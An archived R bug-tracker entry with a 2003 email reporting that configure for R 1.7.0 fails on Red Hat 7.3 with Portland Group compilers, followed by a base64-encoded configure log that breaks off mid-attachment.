Tue Jul 30 11:53:41 2002	ripley	moved from incoming to Installation
Mon Sep 16 13:28:55 2002	pd	changed notes
Mon Sep 16 13:28:55 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2808 *
Subject: building R 1.7.0 under RH7.3
From: Tim Hoar <thoar@cgd.ucar.edu>
Date: Mon, 21 Apr 2003 13:16:16 -0600 (MDT)
--This is with foreign compilers
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2808 <==
From mailnull@stat.math.ethz.ch Mon Apr 21 21:17:03 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3LJH3pD003490
	for <R-bugs@biostat.ku.dk>; Mon, 21 Apr 2003 21:17:03 +0200 (MET DST)
Received: from hypatia.math.ethz.ch (mailnull@localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h3LJH0Ua017506
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Mon, 21 Apr 2003 21:17:00 +0200 (MEST)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.9/8.12.6/Submit) id h3LJGxvE017505
	for R-bugs@biostat.ku.dk; Mon, 21 Apr 2003 21:16:59 +0200 (MEST)
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h3LJGmUZ017480
	for <r-bugs@lists.r-project.org>; Mon, 21 Apr 2003 21:16:49 +0200 (MEST)
Received: from tablemtn.cgd.ucar.edu ([128.117.21.12])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 197gmW-0008MQ-00
	for <r-bugs@R-project.org>; Mon, 21 Apr 2003 14:16:48 -0500
Received: from sunray2.cgd.ucar.edu (sunray2.cgd.ucar.edu [128.117.24.201])
	by tablemtn.cgd.ucar.edu (8.12.8/8.12.8) with ESMTP id h3LJGAJT002255
	for <r-bugs@R-project.org>; Mon, 21 Apr 2003 13:16:10 -0600 (MDT)
Received: from localhost (thoar@localhost)
	by sunray2.cgd.ucar.edu (8.11.6+Sun/8.11.6) with ESMTP id h3LJGGZ24809
	for <r-bugs@R-project.org>; Mon, 21 Apr 2003 13:16:16 -0600 (MDT)
X-Authentication-Warning: sunray2.cgd.ucar.edu: thoar owned process doing -bs
Date: Mon, 21 Apr 2003 13:16:16 -0600 (MDT)
From: Tim Hoar <thoar@cgd.ucar.edu>
X-Sender: <thoar@sunray2>
Reply-To: Tim Hoar <thoar@ucar.edu>
To: <r-bugs@R-project.org>
Subject: building R 1.7.0 under RH7.3
Message-ID: <Pine.GSO.4.30.0304211257440.23064-200000@sunray2>
MIME-Version: 1.0
Content-Type: MULTIPART/MIXED; BOUNDARY="-559023410-959030623-1050952576=:23064"
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=-7.3 required=5.0
	tests=USER_AGENT_PINE,X_AUTH_WARNING
	version=2.53
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.53 (1.174.2.15-2003-03-30-exp)

  This message is in MIME format.  The first part should be readable text,
  while the remaining parts are likely unreadable without MIME-aware tools.
  Send mail to mime@docserver.cac.washington.edu for more info.

---559023410-959030623-1050952576=:23064
Content-Type: TEXT/PLAIN; charset=US-ASCII


The configure process does not seem to be working as well as it had for
previous versions ... constantly seems to complain about being unable to
determine environment variables.

I am trying to use the PG set of compilers (because the netCDF library was
built with them, and I will need to use it. I have had problems with this in
the past, although particularly with the Intel Compilers).


setenv R_PAPERSIZE letter
setenv CC pgcc
setenv F77 pgf90
setenv CXX pgCC
[note ALL other environment vars are "undefined", including LD_LIBRARY_PATH]

Linux poorman 2.4.18-17.7.xsmp #1 SMP Tue Oct 8 12:37:04 EDT 2002 i686 unknown
RH 7.3, on a 1.7Ghz Pentium

./configure --prefix=/contrib/R-1.7.0 >& configure.attempt.1

results in two things --

The first is that there seems to be a "-x" getting fed to the PG compilers,
which is not a valid option.  I don't know if this is the root problem ...

The second (and seemingly fatal one) is "unable to determine CPICFLAGS".
So -- I set it and try again ...

setenv CPICFLAGS -kpic
./configure --prefix=/contrib/R-1.7.0 >& configure.attempt.2

which  generates "unable to determine FPICFLAGS" ...

and the same scenario is repeated several more times, with "the next"
environment variable not getting useful default values ...


Anyone else report this?

Thanks -- Tim

## Tim Hoar, Associate Scientist              email: thoar@ucar.edu     ##
## Geophysical Statistics Project             phone: 303-497-1708       ##
## National Center for Atmospheric Research   FAX  : 303-497-1333       ##
## Boulder, CO  80307                    http://www.cgd.ucar.edu/~thoar ##

---559023410-959030623-1050952576=:23064
Content-Type: TEXT/PLAIN; charset=US-ASCII; name="configure.attempt.1"
Content-Transfer-Encoding: BASE64
Content-ID: <Pine.GSO.4.30.0304211316160.23064@sunray2>
Content-Description: 
Content-Disposition: attachment; filename="configure.attempt.1"

Y2hlY2tpbmcgZm9yIGEgQlNELWNvbXBhdGlibGUgaW5zdGFsbC4uLiAvdXNy
L2Jpbi9pbnN0YWxsIC1jDQpjaGVja2luZyB3aGV0aGVyIGJ1aWxkIGVudmly
b25tZW50IGlzIHNhbmUuLi4geWVzDQpjaGVja2luZyB3aGV0aGVyIG1ha2Ug
c2V0cyAkKE1BS0UpLi4uIHllcw0KY2hlY2tpbmcgZm9yIHdvcmtpbmcgYWNs
b2NhbC0xLjQuLi4gZm91bmQNCmNoZWNraW5nIGZvciB3b3JraW5nIGF1dG9j
b25mLi4uIGZvdW5kDQpjaGVja2luZyBmb3Igd29ya2luZyBhdXRvbWFrZS0x
LjQuLi4gZm91bmQNCmNoZWNraW5nIGZvciB3b3JraW5nIGF1dG9oZWFkZXIu
Li4gZm91bmQNCmNoZWNraW5nIGZvciB3b3JraW5nIG1ha2VpbmZvLi4uIGZv
dW5kDQpjaGVja2luZyBidWlsZCBzeXN0ZW0gdHlwZS4uLiBpNjg2LXBjLWxp
bnV4LWdudQ0KY2hlY2tpbmcgaG9zdCBzeXN0ZW0gdHlwZS4uLiBpNjg2LXBj
LWxpbnV4LWdudQ0KbG9hZGluZyBzaXRlIHNjcmlwdCAnLi9jb25maWcuc2l0
ZScNCmxvYWRpbmcgYnVpbGQgc3BlY2lmaWMgc2NyaXB0ICcuL2NvbmZpZy5z
aXRlJw0KY2hlY2tpbmcgZm9yIHB3ZC4uLiAvYmluL3B3ZA0KY2hlY2tpbmcg
d2hldGhlciBidWlsZGRpciBpcyBzcmNkaXIuLi4geWVzDQpjaGVja2luZyBm
b3IgZ2F3ay4uLiBnYXdrDQpjaGVja2luZyBmb3IgZWdyZXAuLi4gZ3JlcCAt
RQ0KY2hlY2tpbmcgd2hldGhlciBsbiAtcyB3b3Jrcy4uLiB5ZXMNCmNoZWNr
aW5nIGZvciByYW5saWIuLi4gcmFubGliDQpjaGVja2luZyBmb3IgYmlzb24u
Li4gYmlzb24gLXkNCmNoZWNraW5nIGZvciBhci4uLiBhcg0KY2hlY2tpbmcg
Zm9yIGphdmFjLi4uIG5vDQpjaGVja2luZyBmb3IgbGVzcy4uLiAvdXNyL2Jp
bi9sZXNzDQpjaGVja2luZyBmb3IgcGVybC4uLiAvdXNyL2xvY2FsL2Jpbi9w
ZXJsDQpjaGVja2luZyB3aGV0aGVyIHBlcmwgdmVyc2lvbiBpcyBhdCBsZWFz
dCA1LjAwNC4uLiB5ZXMNCmNoZWNraW5nIGZvciBkdmlwcy4uLiAvdXNyL2Jp
bi9kdmlwcw0KY2hlY2tpbmcgZm9yIHRleC4uLiAvdXNyL2Jpbi90ZXgNCmNo
ZWNraW5nIGZvciBsYXRleC4uLiAvdXNyL2Jpbi9sYXRleA0KY2hlY2tpbmcg
Zm9yIG1ha2VpbmRleC4uLiAvdXNyL2Jpbi9tYWtlaW5kZXgNCmNoZWNraW5n
IGZvciBwZGZ0ZXguLi4gL3Vzci9iaW4vcGRmdGV4DQpjaGVja2luZyBmb3Ig
cGRmbGF0ZXguLi4gL3Vzci9iaW4vcGRmbGF0ZXgNCmNoZWNraW5nIGZvciBt
YWtlaW5mby4uLiAvdXNyL2Jpbi9tYWtlaW5mbw0KY2hlY2tpbmcgZm9yIHVu
emlwLi4uIG5vDQpjaGVja2luZyBmb3IgemlwLi4uIG5vDQpjaGVja2luZyBm
b3IgZ2NjLi4uIHBnY2MNCmNoZWNraW5nIGZvciBDIGNvbXBpbGVyIGRlZmF1
bHQgb3V0cHV0Li4uIGEub3V0DQpjaGVja2luZyB3aGV0aGVyIHRoZSBDIGNv
bXBpbGVyIHdvcmtzLi4uIHllcw0KY2hlY2tpbmcgd2hldGhlciB3ZSBhcmUg
Y3Jvc3MgY29tcGlsaW5nLi4uIG5vDQpjaGVja2luZyBmb3Igc3VmZml4IG9m
IGV4ZWN1dGFibGVzLi4uIA0KY2hlY2tpbmcgZm9yIHN1ZmZpeCBvZiBvYmpl
Y3QgZmlsZXMuLi4gbw0KY2hlY2tpbmcgd2hldGhlciB3ZSBhcmUgdXNpbmcg
dGhlIEdOVSBDIGNvbXBpbGVyLi4uIG5vDQpjaGVja2luZyB3aGV0aGVyIHBn
Y2MgYWNjZXB0cyAtZy4uLiB5ZXMNCmNoZWNraW5nIGZvciBwZ2NjIG9wdGlv
biB0byBhY2NlcHQgQU5TSSBDLi4uIG5vbmUgbmVlZGVkDQpjaGVja2luZyBm
b3Igbm9uLUdOVSBsZC4uLiAvdXNyL2Jpbi9sZA0KY2hlY2tpbmcgaWYgdGhl
IGxpbmtlciAoL3Vzci9iaW4vbGQpIGlzIEdOVSBsZC4uLiB5ZXMNCmNoZWNr
aW5nIGZvciAvdXNyL2Jpbi9sZCBvcHRpb24gdG8gcmVsb2FkIG9iamVjdCBm
aWxlcy4uLiAtcg0KY2hlY2tpbmcgZm9yIEJTRC1jb21wYXRpYmxlIG5tLi4u
IC91c3IvYmluL25tIC1CDQpjaGVja2luZyBmb3IgYSBzZWQgdGhhdCBkb2Vz
IG5vdCB0cnVuY2F0ZSBvdXRwdXQuLi4gL2Jpbi9zZWQNCmNoZWNraW5nIGhv
dyB0byByZWNvZ25pc2UgZGVwZW5kZW50IGxpYnJhcmllcy4uLiBwYXNzX2Fs
bA0KY2hlY2tpbmcgY29tbWFuZCB0byBwYXJzZSAvdXNyL2Jpbi9ubSAtQiBv
dXRwdXQuLi4gb2sNCmNoZWNraW5nIGhvdyB0byBydW4gdGhlIEMgcHJlcHJv
Y2Vzc29yLi4uIHBnY2MgLUUNCmNoZWNraW5nIGZvciBBTlNJIEMgaGVhZGVy
IGZpbGVzLi4uIHllcw0KY2hlY2tpbmcgZm9yIHN5cy90eXBlcy5oLi4uIHll
cw0KY2hlY2tpbmcgZm9yIHN5cy9zdGF0LmguLi4geWVzDQpjaGVja2luZyBm
b3Igc3RkbGliLmguLi4geWVzDQpjaGVja2luZyBmb3Igc3RyaW5nLmguLi4g
eWVzDQpjaGVja2luZyBmb3IgbWVtb3J5LmguLi4geWVzDQpjaGVja2luZyBm
b3Igc3RyaW5ncy5oLi4uIHllcw0KY2hlY2tpbmcgZm9yIGludHR5cGVzLmgu
Li4geWVzDQpjaGVja2luZyBmb3Igc3RkaW50LmguLi4geWVzDQpjaGVja2lu
ZyBmb3IgdW5pc3RkLmguLi4geWVzDQpjaGVja2luZyBkbGZjbi5oIHVzYWJp
bGl0eS4uLiB5ZXMNCmNoZWNraW5nIGRsZmNuLmggcHJlc2VuY2UuLi4geWVz
DQpjaGVja2luZyBmb3IgZGxmY24uaC4uLiB5ZXMNCmNoZWNraW5nIGZvciBy
YW5saWIuLi4gKGNhY2hlZCkgcmFubGliDQpjaGVja2luZyBmb3Igc3RyaXAu
Li4gc3RyaXANCmNoZWNraW5nIGZvciBvYmpkaXIuLi4gLmxpYnMNCmNoZWNr
aW5nIGZvciBwZ2NjIG9wdGlvbiB0byBwcm9kdWNlIFBJQy4uLiBub25lDQpj
aGVja2luZyBpZiBwZ2NjIHN0YXRpYyBmbGFnICB3b3Jrcy4uLiB5ZXMNCmNo
ZWNraW5nIGlmIHBnY2Mgc3VwcG9ydHMgLWMgLW8gZmlsZS5vLi4uIHllcw0K
Y2hlY2tpbmcgaWYgcGdjYyBzdXBwb3J0cyAtYyAtbyBmaWxlLmxvLi4uIHll
cw0KY2hlY2tpbmcgd2hldGhlciB0aGUgbGlua2VyICgvdXNyL2Jpbi9sZCkg
c3VwcG9ydHMgc2hhcmVkIGxpYnJhcmllcy4uLiB5ZXMNCmNoZWNraW5nIGhv
dyB0byBoYXJkY29kZSBsaWJyYXJ5IHBhdGhzIGludG8gcHJvZ3JhbXMuLi4g
aW1tZWRpYXRlDQpjaGVja2luZyB3aGV0aGVyIHN0cmlwcGluZyBsaWJyYXJp
ZXMgaXMgcG9zc2libGUuLi4geWVzDQpjaGVja2luZyBkeW5hbWljIGxpbmtl
ciBjaGFyYWN0ZXJpc3RpY3MuLi4gR05VL0xpbnV4IGxkLnNvDQpjaGVja2lu
ZyBpZiBsaWJ0b29sIHN1cHBvcnRzIHNoYXJlZCBsaWJyYXJpZXMuLi4gbm8N
CmNoZWNraW5nIHdoZXRoZXIgdG8gYnVpbGQgc2hhcmVkIGxpYnJhcmllcy4u
LiBubw0KY2hlY2tpbmcgd2hldGhlciB0byBidWlsZCBzdGF0aWMgbGlicmFy
aWVzLi4uIHllcw0KY3JlYXRpbmcgbGlidG9vbA0KY2hlY2tpbmcgd2hldGhl
ciBtYWtlaW5mbyB2ZXJzaW9uIGlzIGF0IGxlYXN0IDQuLi4geWVzDQpjaGVj
a2luZyBmb3IgbmV0c2NhcGUuLi4gL3Vzci9iaW4vbmV0c2NhcGUNCnVzaW5n
IGRlZmF1bHQgYnJvd3NlciAuLi4gL3Vzci9iaW4vbmV0c2NhcGUNCmNoZWNr
aW5nIGZvciBhY3JvcmVhZC4uLiAvdXNyL2xvY2FsL2Jpbi9hY3JvcmVhZA0K
Y2hlY2tpbmcgZm9yIGdjYy4uLiAoY2FjaGVkKSBwZ2NjDQpjaGVja2luZyB3
aGV0aGVyIHdlIGFyZSB1c2luZyB0aGUgR05VIEMgY29tcGlsZXIuLi4gKGNh
Y2hlZCkgbm8NCmNoZWNraW5nIHdoZXRoZXIgcGdjYyBhY2NlcHRzIC1nLi4u
IChjYWNoZWQpIHllcw0KY2hlY2tpbmcgZm9yIHBnY2Mgb3B0aW9uIHRvIGFj
Y2VwdCBBTlNJIEMuLi4gKGNhY2hlZCkgbm9uZSBuZWVkZWQNCmNoZWNraW5n
IGhvdyB0byBydW4gdGhlIEMgcHJlcHJvY2Vzc29yLi4uIHBnY2MgLUUNCmRl
ZmluaW5nIEY3NyB0byBiZSBwZ2Y5MA0KY2hlY2tpbmcgd2hldGhlciB3ZSBh
cmUgdXNpbmcgdGhlIEdOVSBGb3J0cmFuIDc3IGNvbXBpbGVyLi4uIG5vDQpj
aGVja2luZyB3aGV0aGVyIHBnZjkwIGFjY2VwdHMgLWcuLi4geWVzDQpjaGVj
a2luZyB3aGV0aGVyIHdlIGFyZSB1c2luZyB0aGUgR05VIEMrKyBjb21waWxl
ci4uLiBubw0KY2hlY2tpbmcgd2hldGhlciBwZ0NDIGFjY2VwdHMgLWcuLi4g
eWVzDQpjaGVja2luZyBob3cgdG8gcnVuIHRoZSBDKysgcHJlcHJvY2Vzc29y
Li4uIHBnQ0MgLUUNCmNoZWNraW5nIGZvciBtYWluIGluIC1sbS4uLiB5ZXMN
CmNoZWNraW5nIGZvciBzaW4gaW4gLWxtLi4uIHllcw0KY2hlY2tpbmcgZm9y
IG1haW4gaW4gLWxuY3Vyc2VzLi4uIHllcw0KY2hlY2tpbmcgZm9yIGRsb3Bl
biBpbiAtbGRsLi4uIHllcw0KY2hlY2tpbmcgZm9yIHJsX2NhbGxiYWNrX3Jl
YWRfY2hhciBpbiAtbHJlYWRsaW5lLi4uIHllcw0KY2hlY2tpbmcgZm9yIEFO
U0kgQyBoZWFkZXIgZmlsZXMuLi4gKGNhY2hlZCkgeWVzDQpjaGVja2luZyB3
aGV0aGVyIHRpbWUuaCBhbmQgc3lzL3RpbWUuaCBtYXkgYm90aCBiZSBpbmNs
dWRlZC4uLiB5ZXMNCmNoZWNraW5nIGZvciBkaXJlbnQuaCB0aGF0IGRlZmlu
ZXMgRElSLi4uIHllcw0KY2hlY2tpbmcgZm9yIGxpYnJhcnkgY29udGFpbmlu
ZyBvcGVuZGlyLi4uIG5vbmUgcmVxdWlyZWQNCmNoZWNraW5nIGZvciBzeXMv
d2FpdC5oIHRoYXQgaXMgUE9TSVguMSBjb21wYXRpYmxlLi4uIHllcw0KY2hl
Y2tpbmcgYXJwYS9pbmV0LmggdXNhYmlsaXR5Li4uIHllcw0KY2hlY2tpbmcg
YXJwYS9pbmV0LmggcHJlc2VuY2UuLi4geWVzDQpjaGVja2luZyBmb3IgYXJw
YS9pbmV0LmguLi4geWVzDQpjaGVja2luZyBkbC5oIHVzYWJpbGl0eS4uLiBu
bw0KY2hlY2tpbmcgZGwuaCBwcmVzZW5jZS4uLiBubw0KY2hlY2tpbmcgZm9y
IGRsLmguLi4gbm8NCmNoZWNraW5nIGZvciBkbGZjbi5oLi4uIChjYWNoZWQp
IHllcw0KY2hlY2tpbmcgZWxmLmggdXNhYmlsaXR5Li4uIHllcw0KY2hlY2tp
bmcgZWxmLmggcHJlc2VuY2UuLi4geWVzDQpjaGVja2luZyBmb3IgZWxmLmgu
Li4geWVzDQpjaGVja2luZyBmY250bC5oIHVzYWJpbGl0eS4uLiB5ZXMNCmNo
ZWNraW5nIGZjbnRsLmggcHJlc2VuY2UuLi4geWVzDQpjaGVja2luZyBmb3Ig
ZmNudGwuaC4uLiB5ZXMNCmNoZWNraW5nIGZsb2F0aW5ncG9pbnQuaCB1c2Fi
aWxpdHkuLi4gbm8NCmNoZWNraW5nIGZsb2F0aW5ncG9pbnQuaCBwcmVzZW5j
ZS4uLiBubw0KY2hlY2tpbmcgZm9yIGZsb2F0aW5ncG9pbnQuaC4uLiBubw0K
Y2hlY2tpbmcgZnB1X2NvbnRyb2wuaCB1c2FiaWxpdHkuLi4geWVzDQpjaGVj
a2luZyBmcHVfY29udHJvbC5oIHByZXNlbmNlLi4uIHllcw0KY2hlY2tpbmcg
Zm9yIGZwdV9jb250cm9sLmguLi4geWVzDQpjaGVja2luZyBncnAuaCB1c2Fi
aWxpdHkuLi4geWVzDQpjaGVja2luZyBncnAuaCBwcmVzZW5jZS4uLiB5ZXMN
CmNoZWNraW5nIGZvciBncnAuaC4uLiB5ZXMNCmNoZWNraW5nIGllZWU3NTQu
aCB1c2FiaWxpdHkuLi4geWVzDQpjaGVja2luZyBpZWVlNzU0LmggcHJlc2Vu
Y2UuLi4geWVzDQpjaGVja2luZyBmb3IgaWVlZTc1NC5oLi4uIHllcw0KY2hl
Y2tpbmcgaWVlZWZwLmggdXNhYmlsaXR5Li4uIG5vDQpjaGVja2luZyBpZWVl
ZnAuaCBwcmVzZW5jZS4uLiBubw0KY2hlY2tpbmcgZm9yIGllZWVmcC5oLi4u
IG5vDQpjaGVja2luZyBsb2NhbGUuaCB1c2FiaWxpdHkuLi4geWVzDQpjaGVj
a2luZyBsb2NhbGUuaCBwcmVzZW5jZS4uLiB5ZXMNCmNoZWNraW5nIGZvciBs
b2NhbGUuaC4uLiB5ZXMNCmNoZWNraW5nIG5ldGRiLmggdXNhYmlsaXR5Li4u
IHllcw0KY2hlY2tpbmcgbmV0ZGIuaCBwcmVzZW5jZS4uLiB5ZXMNCmNoZWNr
aW5nIGZvciBuZXRkYi5oLi4uIHllcw0KY2hlY2tpbmcgbmV0aW5ldC9pbi5o
IHVzYWJpbGl0eS4uLiB5ZXMNCmNoZWNraW5nIG5ldGluZXQvaW4uaCBwcmVz
ZW5jZS4uLiB5ZXMNCmNoZWNraW5nIGZvciBuZXRpbmV0L2luLmguLi4geWVz
DQpjaGVja2luZyBwd2QuaCB1c2FiaWxpdHkuLi4geWVzDQpjaGVja2luZyBw
d2QuaCBwcmVzZW5jZS4uLiB5ZXMNCmNoZWNraW5nIGZvciBwd2QuaC4uLiB5
ZXMNCmNoZWNraW5nIHJlYWRsaW5lL2hpc3RvcnkuaCB1c2FiaWxpdHkuLi4g
eWVzDQpjaGVja2luZyByZWFkbGluZS9oaXN0b3J5LmggcHJlc2VuY2UuLi4g
eWVzDQpjaGVja2luZyBmb3IgcmVhZGxpbmUvaGlzdG9yeS5oLi4uIHllcw0K
Y2hlY2tpbmcgcmVhZGxpbmUvcmVhZGxpbmUuaCB1c2FiaWxpdHkuLi4geWVz
DQpjaGVja2luZyByZWFkbGluZS9yZWFkbGluZS5oIHByZXNlbmNlLi4uIHll
cw0KY2hlY2tpbmcgZm9yIHJlYWRsaW5lL3JlYWRsaW5lLmguLi4geWVzDQpj
aGVja2luZyBmb3Igc3RyaW5ncy5oLi4uIChjYWNoZWQpIHllcw0KY2hlY2tp
bmcgc3lzL3BhcmFtLmggdXNhYmlsaXR5Li4uIHllcw0KY2hlY2tpbmcgc3lz
L3BhcmFtLmggcHJlc2VuY2UuLi4geWVzDQpjaGVja2luZyBmb3Igc3lzL3Bh
cmFtLmguLi4geWVzDQpjaGVja2luZyBzeXMvc2VsZWN0LmggdXNhYmlsaXR5
Li4uIHllcw0KY2hlY2tpbmcgc3lzL3NlbGVjdC5oIHByZXNlbmNlLi4uIHll
cw0KY2hlY2tpbmcgZm9yIHN5cy9zZWxlY3QuaC4uLiB5ZXMNCmNoZWNraW5n
IHN5cy9zb2NrZXQuaCB1c2FiaWxpdHkuLi4geWVzDQpjaGVja2luZyBzeXMv
c29ja2V0LmggcHJlc2VuY2UuLi4geWVzDQpjaGVja2luZyBmb3Igc3lzL3Nv
Y2tldC5oLi4uIHllcw0KY2hlY2tpbmcgZm9yIHN5cy9zdGF0LmguLi4gKGNh
Y2hlZCkgeWVzDQpjaGVja2luZyBzeXMvdGltZS5oIHVzYWJpbGl0eS4uLiB5
ZXMNCmNoZWNraW5nIHN5cy90aW1lLmggcHJlc2VuY2UuLi4geWVzDQpjaGVj
a2luZyBmb3Igc3lzL3RpbWUuaC4uLiB5ZXMNCmNoZWNraW5nIHN5cy90aW1l
cy5oIHVzYWJpbGl0eS4uLiB5ZXMNCmNoZWNraW5nIHN5cy90aW1lcy5oIHBy
ZXNlbmNlLi4uIHllcw0KY2hlY2tpbmcgZm9yIHN5cy90aW1lcy5oLi4uIHll
cw0KY2hlY2tpbmcgc3lzL3V0c25hbWUuaCB1c2FiaWxpdHkuLi4geWVzDQpj
aGVja2luZyBzeXMvdXRzbmFtZS5oIHByZXNlbmNlLi4uIHllcw0KY2hlY2tp
bmcgZm9yIHN5cy91dHNuYW1lLmguLi4geWVzDQpjaGVja2luZyBmb3IgdW5p
c3RkLmguLi4gKGNhY2hlZCkgeWVzDQpjaGVja2luZyBlcnJuby5oIHVzYWJp
bGl0eS4uLiB5ZXMNCmNoZWNraW5nIGVycm5vLmggcHJlc2VuY2UuLi4geWVz
DQpjaGVja2luZyBmb3IgZXJybm8uaC4uLiB5ZXMNCmNoZWNraW5nIHN0ZGFy
Zy5oIHVzYWJpbGl0eS4uLiB5ZXMNCmNoZWNraW5nIHN0ZGFyZy5oIHByZXNl
bmNlLi4uIHllcw0KY2hlY2tpbmcgZm9yIHN0ZGFyZy5oLi4uIHllcw0KY2hl
Y2tpbmcgZm9yIHN0cmluZy5oLi4uIChjYWNoZWQpIHllcw0KY2hlY2tpbmcg
d2hldGhlciBzZXRqbXAuaCBpcyBQT1NJWC4xIGNvbXBhdGlibGUuLi4geWVz
DQpjaGVja2luZyBmb3IgR05VIEMgbGlicmFyeSB3aXRoIHZlcnNpb24gPj0g
Mi4uLiB5ZXMNCmNoZWNraW5nIHJldHVybiB0eXBlIG9mIHNpZ25hbCBoYW5k
bGVycy4uLiB2b2lkDQpjaGVja2luZyBmb3IgcGlkX3QuLi4geWVzDQpjaGVj
a2luZyBmb3Igc2l6ZV90Li4uIHllcw0KY2hlY2tpbmcgZm9yIGJsa2NudF90
Li4uIHllcw0KY2hlY2tpbmcgZm9yIHR5cGUgb2Ygc29ja2V0IGxlbmd0aC4u
LiBzb2NrbGVuX3QgKg0KY2hlY2tpbmcgd2hldGhlciBieXRlIG9yZGVyaW5n
IGlzIGJpZ2VuZGlhbi4uLiBubw0KY2hlY2tpbmcgZm9yIGFuIEFOU0kgQy1j
b25mb3JtaW5nIGNvbnN0Li4uIHllcw0KY2hlY2tpbmcgZm9yIGludC4uLiB5
ZXMNCmNoZWNraW5nIHNpemUgb2YgaW50Li4uIDQNCmNoZWNraW5nIGZvciBs
b25nLi4uIHllcw0KY2hlY2tpbmcgc2l6ZSBvZiBsb25nLi4uIDQNCmNoZWNr
aW5nIGZvciBsb25nIGxvbmcuLi4geWVzDQpjaGVja2luZyBzaXplIG9mIGxv
bmcgbG9uZy4uLiA4DQpjaGVja2luZyBmb3IgbG9uZyBkb3VibGUuLi4geWVz
DQpjaGVja2luZyBzaXplIG9mIGxvbmcgZG91YmxlLi4uIDgNCmNoZWNraW5n
IHdoZXRoZXIgd2UgY2FuIGNvbXB1dGUgQyBNYWtlIGRlcGVuZGVuY2llcy4u
LiB5ZXMsIHVzaW5nIGNwcCAtTQ0KY2hlY2tpbmcgd2hldGhlciBwZ2NjIHN1
cHBvcnRzIC1jIC1vIEZJTEUubG8uLi4geWVzDQpjaGVja2luZyBob3cgdG8g
Z2V0IHZlcmJvc2UgbGlua2luZyBvdXRwdXQgZnJvbSBwZ2Y5MC4uLiAtdg0K
Y2hlY2tpbmcgZm9yIEZvcnRyYW4gNzcgbGlicmFyaWVzLi4uICAtTC91c3Iv
bG9jYWwvbGliIC1ML3Vzci9sb2NhbC9wZ2kvbGludXg4Ni9saWIgLUwvdXNy
L2xpYiAtTC91c3IvbGliL2djYy1saWIvaTM4Ni1yZWRoYXQtbGludXgvMi45
NiAtbHBnZjkwIC1scGdmOTBfcnBtMSAtbHBnZjkwMiAtbHBnZjkwcnRsIC1s
cGdmdG5ydGwgLWxtIC1scGdjDQpjaGVja2luZyBmb3IgZHVtbXkgbWFpbiB0
byBsaW5rIHdpdGggRm9ydHJhbiA3NyBsaWJyYXJpZXMuLi4gbm9uZQ0KY2hl
Y2tpbmcgZm9yIEZvcnRyYW4gNzcgbmFtZS1tYW5nbGluZyBzY2hlbWUuLi4g
bG93ZXIgY2FzZSwgdW5kZXJzY29yZSwgbm8gZXh0cmEgdW5kZXJzY29yZQ0K
Y2hlY2tpbmcgd2hldGhlciBwZ2Y5MCBhcHBlbmRzIHVuZGVyc2NvcmVzIHRv
IGV4dGVybmFsIG5hbWVzLi4uIHllcw0KY2hlY2tpbmcgd2hldGhlciBtaXhl
ZCBDL0ZvcnRyYW4gY29kZSBjYW4gYmUgcnVuLi4uIHllcw0KY2hlY2tpbmcg
d2hldGhlciBwZ2Y5MCBhbmQgcGdjYyBhZ3JlZSBvbiBpbnQgYW5kIGRvdWJs
ZS4uLiB5ZXMNCmNoZWNraW5nIHdoZXRoZXIgcGdmOTAgYW5kIHBnY2MgYWdy
ZWUgb24gZG91YmxlIGNvbXBsZXguLi4geWVzDQpjaGVja2luZyB3aGV0aGVy
IHBnZjkwIHN1cHBvcnRzIC1jIC1vIEZJTEUubG8uLi4geWVzDQpjaGVja2lu
ZyB3aGV0aGVyIHBnQ0MgYWNjZXB0cyAtTSBmb3IgZ2VuZXJhdGluZyBkZXBl
bmRlbmNpZXMuLi4geWVzDQpjaGVja2luZyB3aGV0aGVyIHBnQ0Mgc3VwcG9y
dHMgLWMgLW8gRklMRS5sby4uLiB5ZXMNCmNoZWNraW5nIHdoZXRoZXIgcGdj
YyBhY2NlcHRzIC1taWVlZS1mcC4uLiB5ZXMNCmNoZWNraW5nIHdoZXRoZXIg
cGdmOTAgYWNjZXB0cyAtbWllZWUtZnAuLi4geWVzDQpjaGVja2luZyB3aGV0
aGVyIHBnQ0MgYWNjZXB0cyAtbWllZWUtZnAuLi4geWVzDQpjaGVja2luZyBm
b3IgeG1rbWYuLi4gL3Vzci9YMTFSNi9iaW4veG1rbWYNCnBnY2MtV2Fybmlu
Zy1Vbmtub3duIHN3aXRjaDogLXgNCnBnY2MtV2FybmluZy1Vbmtub3duIHN3
aXRjaDogLQ0KRmlsZSB3aXRoIHVua25vd24gc3VmZml4IHBhc3NlZCB0byBs
aW5rZXI6IGMNCi91c3IvYmluL2xkOiBjYW5ub3Qgb3BlbiBjOiBObyBzdWNo
IGZpbGUgb3IgZGlyZWN0b3J5DQovdXNyL1gxMVI2L2Jpbi94bWttZjogbGlu
ZSA3MDogIDcyMDcgQWJvcnRlZCAgICAgICAgICAgICAgICAgKGNvcmUgZHVt
cGVkKSBpbWFrZSAkaW1ha2VfZGVmaW5lcyAkYXJncw0KVXNhZ2U6IHdoaWNo
IFtvcHRpb25zXSBbLS1dIHByb2dyYW1uYW1lIFsuLi5dDQpPcHRpb25zOiAt
LXZlcnNpb24sIC1bdlZdIFByaW50IHZlcnNpb24gYW5kIGV4aXQgc3VjY2Vz
c2Z1bGx5Lg0KICAgICAgICAgLS1oZWxwLCAgICAgICAgICBQcmludCB0aGlz
IGhlbHAgYW5kIGV4aXQgc3VjY2Vzc2Z1bGx5Lg0KICAgICAgICAgLS1za2lw
LWRvdCAgICAgICBTa2lwIGRpcmVjdG9yaWVzIGluIFBBVEggdGhhdCBzdGFy
dCB3aXRoIGEgZG90Lg0KICAgICAgICAgLS1za2lwLXRpbGRlICAgICBTa2lw
